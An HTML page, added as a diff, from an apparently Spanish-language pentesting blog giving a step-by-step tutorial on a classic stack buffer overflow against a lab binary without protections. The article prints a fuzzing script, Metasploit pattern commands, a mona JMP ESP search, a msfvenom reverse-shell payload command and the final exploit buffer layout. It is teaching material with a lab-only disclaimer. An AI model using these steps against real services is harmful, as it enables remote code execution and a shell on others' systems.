@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- === PRIMARY SEO (replace variables) === -->
+  <title>Buffer overflow básico: el proceso paso a paso que sigo en un binario vulnerable · RedTeamNotes</title>
+  <meta name="description" content="Fuzzing, control de EIP, encontrar el offset con un patrón, y disparar shellcode — el flujo completo de un buffer overflow clásico en un entorno de laboratorio (sin protecciones modernas).">
+  <meta name="keywords" content="buffer overflow, explotación de binarios, fundamentos, exploit development">
+  <meta name="author" content="R3yv4j">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://r3yv4j.github.io/RedTeamNotes/posts/buffer-overflow-basico.html">
+
+  <!-- === OPEN GRAPH === -->
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://r3yv4j.github.io/RedTeamNotes/posts/buffer-overflow-basico.html">
+  <meta property="og:title" content="Buffer overflow básico: el proceso paso a paso que sigo en un binario vulnerable · RedTeamNotes">
+  <meta property="og:description" content="Fuzzing, control de EIP, encontrar el offset con un patrón, y disparar shellcode — el flujo completo de un buffer overflow clásico en un entorno de laboratorio (sin protecciones modernas).">
+  <meta property="og:image" content="https://r3yv4j.github.io/RedTeamNotes/assets/images/og-buffer-overflow-basico.png">
+  <meta property="og:locale" content="es_ES">
+  <meta property="article:published_time" content="2026-11-04">
+  <meta property="article:author" content="R3yv4j">
+  <meta property="article:section" content="Vulnerabilidades">
+  <meta property="article:tag" content="buffer overflow, explotación de binarios, fundamentos, exploit development">
+
+  <!-- === TWITTER CARDS === -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Buffer overflow básico: el proceso paso a paso que sigo en un binario vulnerable">
+  <meta name="twitter:description" content="Fuzzing, control de EIP, encontrar el offset con un patrón, y disparar shellcode — el flujo completo de un buffer overflow clásico en un entorno de laboratorio (sin protecciones modernas).">
+  <meta name="twitter:image" content="https://r3yv4j.github.io/RedTeamNotes/assets/images/og-buffer-overflow-basico.png">
+
+  <!-- === SCHEMA.ORG ARTICLE === -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "Buffer overflow básico: el proceso paso a paso que sigo en un binario vulnerable",
+    "description": "Fuzzing, control de EIP, encontrar el offset con un patrón, y disparar shellcode — el flujo completo de un buffer overflow clásico en un entorno de laboratorio (sin protecciones modernas).",
+    "image": "https://r3yv4j.github.io/RedTeamNotes/assets/images/og-buffer-overflow-basico.png",
+    "author": {
+      "@type": "Person",
+      "name": "R3yv4j",
+      "url": "https://r3yv4j.github.io/RedTeamNotes/pages/sobre-mi.html"
+    },
+    "publisher": {
+      "@type": "Person",
+      "name": "R3yv4j"
+    },
+    "datePublished": "2026-11-04",
+    "dateModified": "2026-11-04",
+    "mainEntityOfPage": {"@type": "WebPage", "@id": "https://r3yv4j.github.io/RedTeamNotes/posts/buffer-overflow-basico.html"},
+    "articleSection": "Vulnerabilidades",
+    "keywords": "buffer overflow, explotación de binarios, fundamentos, exploit development",
+    "inLanguage": "es"
+  }
+  </script>
+
+  <!-- === BREADCRUMB SCHEMA === -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [
+      {"@type": "ListItem", "position": 1, "name": "Inicio", "item": "https://r3yv4j.github.io/RedTeamNotes/"},
+      {"@type": "ListItem", "position": 2, "name": "Vulnerabilidades", "item": "https://r3yv4j.github.io/RedTeamNotes/categories/vulnerabilidades.html"},
+      {"@type": "ListItem", "position": 3, "name": "Buffer overflow básico: el proceso paso a paso que sigo en un binario vulnerable", "item": "https://r3yv4j.github.io/RedTeamNotes/posts/buffer-overflow-basico.html"}
+    ]
+  }
+  </script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../assets/css/main.css">
+  <link rel="icon" type="image/svg+xml" href="../assets/images/favicon.svg">
+
+  <!-- AdSense (uncomment when approved) -->
+  <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-XXXXXXXXXXXXXXXX" crossorigin="anonymous"></script> -->
+</head>
+<body>
+
+<!-- Reading Progress -->
+<div id="reading-progress" class="reading-progress"></div>
+
+<!-- ============ TOPBAR ============ -->
+<div class="topbar">
+  <div class="container topbar-inner">
+    <span>RTN(7) — Manual de RedTeamNotes</span>
+    <span>R3yv4j</span>
+  </div>
+</div>
+
+<!-- ============ HEADER ============ -->
+<header class="site-header" role="banner">
+  <div class="container">
+    <div class="header-inner">
+      <a href="/RedTeamNotes/" class="logo" aria-label="RedTeamNotes - Inicio">
+        <span class="logo-mark" aria-hidden="true">~/</span>RedTeamNotes
+      </a>
+      <nav role="navigation" aria-label="Navegación principal">
+        <ul class="nav-links" id="nav-links">
+          <li><a href="/RedTeamNotes/">Inicio</a></li>
+          <li><a href="../categories/pentesting.html">Pentesting</a></li>
+          <li><a href="../categories/osint.html">OSINT</a></li>
+          <li><a href="../categories/linux.html">Linux</a></li>
+          <li><a href="../categories/python.html">Python</a></li>
+          <li><a href="../pages/sobre-mi.html">Sobre esto</a></li>
+        </ul>
+      </nav>
+      <div class="header-actions">
+        <button class="btn-search" data-search-open aria-label="Buscar">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+          <span>Ctrl+K</span>
+        </button>
+        <button class="mobile-menu-btn" id="mobile-menu-btn" aria-label="Menú">☰</button>
+      </div>
+    </div>
+  </div>
+</header>
+
+<main id="main-content">
+<!-- ============ ARTICLE HEADER ============ -->
+<div class="article-header">
+  <div class="container">
+    <!-- Breadcrumbs -->
+    <nav class="breadcrumbs" aria-label="Ruta de navegación">
+      <a href="/RedTeamNotes/">Inicio</a>
+      <span class="sep" aria-hidden="true">/</span>
+      <a href="../categories/vulnerabilidades.html">Vulnerabilidades</a>
+      <span class="sep" aria-hidden="true">/</span>
+      <span class="current" aria-current="page">Buffer overflow básico: el proceso paso a paso que sigo en u</span>
+    </nav>
+
+    <!-- Meta top -->
+    <div class="article-meta-top">
+      <span class="card-category cat-vulnerabilidades">Vulnerabilidades</span>
+      <span class="card-date">4 Noviembre 2026</span>
+      <span class="card-read-time" id="read-time">calculando...</span>
+    </div>
+
+    <!-- Title -->
+    <h1 class="article-title" itemprop="headline">Buffer overflow básico: el proceso paso a paso que sigo en un binario vulnerable</h1>
+    <p class="article-subtitle">Fuzzing, control de EIP, encontrar el offset con un patrón, y disparar shellcode — el flujo completo de un buffer overflow clásico en un entorno de laboratorio (sin protecciones modernas).</p>
+
+    <!-- Stats bar -->
+    <div class="article-stats">
+      <span class="stat-item">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+        R3yv4j
+      </span>
+      <span class="stat-item">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+        4 Noviembre 2026
+      </span>
+      <span class="stat-item">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+        <span id="read-time-stat">~4 min</span>
+      </span>
+      <span class="stat-item">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+        Avanzado
+      </span>
+    </div>
+
+  </div>
+</div>
+
+<!-- ============ ARTICLE BODY ============ -->
+<div class="section">
+  <div class="container">
+    <div class="content-with-sidebar">
+
+      <!-- Main Content -->
+      <div>
+
+        <!-- Ad slot top of article (hidden) -->
+        <div class="ad-slot ad-slot-leaderboard" style="display:none;margin-bottom:2rem" aria-hidden="true">
+          <!-- Google AdSense article top -->
+        </div>
+
+        <!-- Table of Contents -->
+        <nav class="toc" id="toc" aria-label="Tabla de contenidos">
+          <div class="toc-title">En este artículo</div>
+          <ul class="toc-list" id="toc-list"><li><a href="#por-que-esto-sigue-siendo-relevante-en-2026">Por qué esto sigue siendo relevante en 2026</a></li>
+<li><a href="#paso-1-fuzzing-para-encontrar-el-crash">Paso 1: fuzzing para encontrar el crash</a></li>
+<li><a href="#paso-2-encontrar-el-offset-exacto-con-un-patron-unico">Paso 2: encontrar el offset exacto con un patrón único</a></li>
+<li><a href="#paso-3-confirmar-el-control-de-eip">Paso 3: confirmar el control de EIP</a></li>
+<li><a href="#paso-4-encontrar-espacio-para-el-shellcode-y-comprobar-bad-characters">Paso 4: encontrar espacio para el shellcode y comprobar bad characters</a></li>
+<li><a href="#paso-5-encontrar-una-direccion-de-salto-valida-jmp-esp">Paso 5: encontrar una dirección de salto válida (JMP ESP)</a></li>
+<li><a href="#paso-6-generar-el-shellcode-y-montar-el-exploit-final">Paso 6: generar el shellcode y montar el exploit final</a></li>
+<li><a href="#lo-que-este-ejercicio-te-ensena-de-verdad">Lo que este ejercicio te enseña de verdad</a></li></ul>
+        </nav>
+
+        <!-- === ARTICLE CONTENT === -->
+        <article class="article-content" itemscope itemtype="https://schema.org/Article" itemprop="articleBody">
+          <h2 id="por-que-esto-sigue-siendo-relevante-en-2026">Por qué esto sigue siendo relevante en 2026</h2>
+<p>Con ASLR, DEP, stack canaries y demás protecciones activas por defecto en sistemas modernos, un buffer overflow clásico como el que describo aquí ya no funciona directamente contra un binario de producción moderno. Pero entender el mecanismo de fondo — cómo se sobrescribe la pila y se controla el flujo de ejecución — sigue siendo la base sobre la que se entienden técnicas más avanzadas de bypass de esas mismas protecciones. Sin esto primero, lo demás no tiene sentido.</p>
+<blockquote>
+<p>Esto es exclusivamente para binarios de laboratorio (tipo los de TryHackMe/HTB Academy diseñados para practicar esto, con protecciones desactivadas a propósito) o software propio compilado sin protecciones. Nunca contra software de terceros sin autorización.</p>
+</blockquote>
+<h2 id="paso-1-fuzzing-para-encontrar-el-crash">Paso 1: fuzzing para encontrar el crash</h2>
+<p>Antes de nada, confirmar que el programa efectivamente se cae con una entrada larga:</p>
+<pre><code class="language-python">import socket
+
+buffer = b&quot;A&quot; * 100
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((&quot;192.168.1.10&quot;, 9999))
+        s.send(buffer)
+        s.close()
+        buffer += b&quot;A&quot; * 100
+    except:
+        print(f&quot;Crash con buffer de tamaño: {len(buffer)}&quot;)
+        break
+</code></pre>
+<p>Este script incrementa el tamaño del buffer hasta que el servicio deja de responder — apuntando a que se produjo un fallo por desbordamiento de algún tipo, aunque todavía no sepamos si es explotable de forma controlada.</p>
+<h2 id="paso-2-encontrar-el-offset-exacto-con-un-patron-unico">Paso 2: encontrar el offset exacto con un patrón único</h2>
+<p>En vez de rellenar todo con "A", uso un patrón cíclico único (con <code>msf-pattern_create</code> de Metasploit) para saber exactamente en qué posición del buffer se sobrescribe el registro EIP:</p>
+<pre><code class="language-bash">msf-pattern_create -l 500
+</code></pre>
+<p>Envío ese patrón en vez de "A"s repetidas, veo en qué valor queda EIP tras el crash (con el programa corriendo bajo un depurador como Immunity Debugger o x64dbg), y luego:</p>
+<pre><code class="language-bash">msf-pattern_offset -l 500 -q &lt;valor_de_EIP&gt;
+</code></pre>
+<p>Esto me da el offset exacto — la cantidad de bytes exactos que hay que escribir antes de llegar al punto donde se controla EIP.</p>
+<h2 id="paso-3-confirmar-el-control-de-eip">Paso 3: confirmar el control de EIP</h2>
+<p>Con el offset conocido, envío ese número exacto de "A"s seguido de 4 bytes reconocibles (por ejemplo "BBBB"):</p>
+<pre><code class="language-python">buffer = b&quot;A&quot; * offset + b&quot;B&quot; * 4
+</code></pre>
+<p>Si EIP muestra exactamente <code>42424242</code> (hex de "BBBB") tras el crash, tengo control confirmado sobre el registro que determina qué se ejecuta a continuación.</p>
+<h2 id="paso-4-encontrar-espacio-para-el-shellcode-y-comprobar-bad-characters">Paso 4: encontrar espacio para el shellcode y comprobar bad characters</h2>
+<p>Antes de meter shellcode real, hay que comprobar qué caracteres el programa "rompe" al procesarlos (por ejemplo, <code>\x00</code> suele terminar cadenas antes de tiempo). Se envía la lista completa de bytes posibles y se compara con lo que llega realmente al buffer en memoria:</p>
+<pre><code class="language-python">badchars = (b&quot;\x01\x02\x03...\xff&quot;)
+buffer = b&quot;A&quot; * offset + b&quot;B&quot; * 4 + badchars
+</code></pre>
+<p>Cualquier byte que no aparezca intacto en memoria tras el envío hay que excluirlo al generar el shellcode final.</p>
+<h2 id="paso-5-encontrar-una-direccion-de-salto-valida-jmp-esp">Paso 5: encontrar una dirección de salto válida (JMP ESP)</h2>
+<p>Con ASLR desactivado (como suele estar en estos laboratorios de práctica), busco una instrucción <code>JMP ESP</code> en algún módulo cargado por el programa que no tenga protecciones activas, para usar su dirección como el nuevo valor de EIP — eso redirige la ejecución justo al punto donde colocamos el shellcode:</p>
+<pre><code class="language-bash"># Con mona.py dentro de Immunity Debugger
+!mona jmp -r esp -cpb &quot;\x00&quot;
+</code></pre>
+<h2 id="paso-6-generar-el-shellcode-y-montar-el-exploit-final">Paso 6: generar el shellcode y montar el exploit final</h2>
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;tu-ip&gt; LPORT=4444 -b &quot;\x00&quot; -f python
+</code></pre>
+<pre><code class="language-python">buffer = b&quot;A&quot; * offset
+buffer += jmp_esp_address  # en formato little-endian
+buffer += b&quot;\x90&quot; * 16  # NOP sled, margen antes del shellcode
+buffer += shellcode
+</code></pre>
+<p>Con el listener de netcat o Metasploit esperando la conexión, envío este buffer final y, si todo el proceso anterior fue correcto, el programa salta al shellcode y devuelve una shell.</p>
+<h2 id="lo-que-este-ejercicio-te-ensena-de-verdad">Lo que este ejercicio te enseña de verdad</h2>
+<p>No es memorizar el proceso — es entender por qué cada paso es necesario: el offset porque no toda la entrada llega al mismo sitio en memoria, los bad characters porque el programa puede corromper el shellcode al procesarlo, la dirección JMP ESP porque no puedes simplemente apuntar EIP a una dirección de memoria fija con ASLR presente (aunque en este ejercicio esté desactivado). Una vez entiendes esto en un binario simple sin protecciones, las técnicas de bypass de protecciones modernas dejan de parecer magia y empiezan a verse como extensiones lógicas del mismo problema base.</p>
+        </article>
+
+        <!-- Tags -->
+        <div class="article-tags" aria-label="Etiquetas del artículo">
+          <a href="#" class="tag">buffer overflow</a>
+<a href="#" class="tag">explotación de binarios</a>
+<a href="#" class="tag">fundamentos</a>
+<a href="#" class="tag">exploit development</a>
+        </div>
+
+        <!-- Ad slot mid-article (hidden) -->
+        <div class="ad-slot ad-slot-leaderboard" style="display:none;margin:1.5rem 0" aria-hidden="true">
+          <!-- Google AdSense in-article -->
+        </div>
+
+        <!-- Author box -->
+        <div class="author-box" itemscope itemtype="https://schema.org/Person">
+          <div class="author-avatar" aria-hidden="true">R3</div>
+          <div class="author-info">
+            <h4 itemprop="name">R3yv4j</h4>
+            <p itemprop="description">Hago pentesting y red teaming. Esto es básicamente mi cuaderno de notas pasado a limpio: lo que aprendo, lo que rombo y lo que tardo demasiado en entender.</p>
+            <div class="author-links">
+              <a href="https://github.com/r3yv4j" target="_blank" rel="noopener" class="author-link">GitHub</a>
+              <a href="https://www.linkedin.com/in/javier-d%C3%ADaz-085b53276/" target="_blank" rel="noopener" class="author-link">LinkedIn</a>
+              <a href="https://r3yv4j.github.io/" target="_blank" rel="noopener" class="author-link">Portfolio</a>
+            </div>
+          </div>
+        </div>
+
+        <!-- Related Articles -->
+        <div class="related-articles" id="related-articles-wrapper">
+          <h3>Relacionado</h3>
+          <div class="related-grid" id="related-articles">
+            <!-- Populated by JS based on category -->
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Sidebar -->
+      <aside class="sidebar" role="complementary" aria-label="Panel lateral del artículo">
+
+        <!-- TOC sidebar (desktop) -->
+        <div class="sidebar-widget">
+          <div class="widget-title">Índice</div>
+          <ul class="toc-list" id="toc-sidebar"><li><a href="#por-que-esto-sigue-siendo-relevante-en-2026">Por qué esto sigue siendo relevante en 2026</a></li>
+<li><a href="#paso-1-fuzzing-para-encontrar-el-crash">Paso 1: fuzzing para encontrar el crash</a></li>
+<li><a href="#paso-2-encontrar-el-offset-exacto-con-un-patron-unico">Paso 2: encontrar el offset exacto con un patrón único</a></li>
+<li><a href="#paso-3-confirmar-el-control-de-eip">Paso 3: confirmar el control de EIP</a></li>
+<li><a href="#paso-4-encontrar-espacio-para-el-shellcode-y-comprobar-bad-characters">Paso 4: encontrar espacio para el shellcode y comprobar bad characters</a></li>
+<li><a href="#paso-5-encontrar-una-direccion-de-salto-valida-jmp-esp">Paso 5: encontrar una dirección de salto válida (JMP ESP)</a></li>
+<li><a href="#paso-6-generar-el-shellcode-y-montar-el-exploit-final">Paso 6: generar el shellcode y montar el exploit final</a></li>
+<li><a href="#lo-que-este-ejercicio-te-ensena-de-verdad">Lo que este ejercicio te enseña de verdad</a></li></ul>
+        </div>
+
+        <!-- Ad slot sidebar (hidden) -->
+        <div class="ad-slot ad-slot-square" style="display:none" aria-hidden="true">
+          <!-- Google AdSense 300x250 -->
+        </div>
+
+        <!-- Share -->
+        <div class="sidebar-widget">
+          <div class="widget-title">Compartir</div>
+          <div style="display:flex;flex-direction:column;gap:0.5rem">
+            <a href="https://twitter.com/intent/tweet?url=https://r3yv4j.github.io/RedTeamNotes/posts/buffer-overflow-basico.html&text=Buffer%20overflow%20básico:%20el%20proceso%20paso%20a%20paso%20que%20sigo%20en%20un%20binario%20vulnerable" target="_blank" rel="noopener" class="btn btn-ghost" style="font-size:0.8rem;padding:0.4rem 0.75rem;justify-content:center">Twitter / X</a>
+            <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://r3yv4j.github.io/RedTeamNotes/posts/buffer-overflow-basico.html" target="_blank" rel="noopener" class="btn btn-ghost" style="font-size:0.8rem;padding:0.4rem 0.75rem;justify-content:center">LinkedIn</a>
+          </div>
+        </div>
+
+      </aside>
+    </div>
+  </div>
+</div>
+</main>
+
+<!-- ============ FOOTER ============ -->
+<footer class="site-footer" role="contentinfo">
+  <div class="container">
+    <div class="footer-bottom" style="padding-top:2rem">
+      <p class="footer-copy">RedTeamNotes · <a href="/RedTeamNotes/">Inicio</a> · <a href="../pages/privacidad.html">Privacidad</a></p>
+      <div class="footer-legal">
+        <a href="../pages/cookies.html">Cookies</a>
+        <a href="../pages/aviso-legal.html">Aviso legal</a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<!-- Search Overlay -->
+<div id="search-overlay" class="search-overlay" role="dialog" aria-modal="true" aria-label="Búsqueda">
+  <div class="search-box">
+    <div class="search-input-wrap">
+      <input type="search" id="search-input" class="search-input" placeholder="Buscar..." autocomplete="off">
+      <button id="search-close" class="search-close" aria-label="Cerrar">✕</button>
+    </div>
+    <ul id="search-results" class="search-results"></ul>
+  </div>
+</div>
+
+<button id="scroll-top" class="scroll-top" aria-label="Volver arriba">▲</button>
+<div id="cookie-banner" class="cookie-banner">
+  <div class="cookie-inner">
+    <p class="cookie-text">Usamos cookies. <a href="../pages/cookies.html">Más info</a></p>
+    <div class="cookie-actions">
+      <button id="cookie-reject" class="btn btn-ghost" style="font-size:0.8rem;padding:0.35rem 0.6rem">Rechazar</button>
+      <button id="cookie-accept" class="btn btn-primary" style="font-size:0.8rem;padding:0.35rem 0.6rem">Aceptar</button>
+    </div>
+  </div>
+</div>
+
+<script src="../assets/js/posts-index.js" defer></script>
+<script src="../assets/js/main.js" defer></script>
+<script>
+  // Artículos relacionados: mismos category, excluyendo el actual
+  document.addEventListener('DOMContentLoaded', () => {
+    const current = "buffer-overflow-basico";
+    const category = "vulnerabilidades";
+    const wrap = document.getElementById('related-articles-wrapper');
+    const grid = document.getElementById('related-articles');
+    const related = (window.POSTS_INDEX || [])
+      .filter(p => p.categorySlug === category && p.slug !== current)
+      .slice(0, 3);
+
+    if (!related.length) { wrap.style.display = 'none'; return; }
+
+    grid.innerHTML = related.map(p => `
+      <article class="card">
+        <div class="card-body" style="padding:1rem">
+          <div class="card-category cat-${p.categorySlug}" style="margin-bottom:0.5rem">${p.category}</div>
+          <h4 class="card-title" style="font-size:0.9rem"><a href="${p.slug}.html">${p.title}</a></h4>
+        </div>
+      </article>
+    `).join('');
+  });
+</script>
+</body>
+</html>
